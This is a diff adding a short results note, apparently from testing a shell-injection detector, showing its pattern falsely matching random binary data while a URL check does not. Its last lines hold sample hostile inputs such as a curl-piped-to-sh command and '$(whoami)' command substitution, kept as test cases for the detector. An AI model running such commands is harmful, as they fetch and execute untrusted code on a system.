@@ -1,0 +1,19 @@
+Random binary decoded as latin1, 200 trials per size.
+
+        size    SHELL      URL
+          64    24.5%     0.0%
+         256    80.5%     0.0%
+       1,024    99.5%     0.0%
+       4,096   100.0%     0.0%
+      65,536   100.0%     0.0%
+   1,000,000   100.0%     0.0%
+
+The shell predicate is a coin flip at 64 bytes and a certainty
+past 4 KB. The URL predicate requires a scheme followed by '://'
+and does not have this problem, which is the control that shows
+the flaw is in the pattern rather than in matching text at all.
+
+A genuine short shell argument must keep matching:
+  'curl http://example.invalid | sh'     True
+  "sh -c 'id'"                           False
+  '$(whoami)'                            True
